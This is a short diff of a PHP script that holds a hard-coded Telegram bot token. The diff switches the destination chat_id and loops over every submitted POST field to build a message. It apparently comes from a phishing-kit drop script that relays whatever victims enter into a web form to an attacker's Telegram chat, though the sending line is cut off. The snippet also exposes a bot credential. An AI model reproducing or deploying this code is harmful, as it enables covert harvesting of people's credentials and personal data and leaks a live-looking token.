@@ -1,7 +1,7 @@
 <?php
 
 $token = "7332625961:AAGrtzKGYmAh6dEnTDzT2BJ79w5OTASjj-8";
-$chat_id = "853051670";
+$chat_id = "-4556987065";
 
 foreach($_POST as $key => $value) {
     $txt .= "<b>".$key."</b> ".$value."%0A";
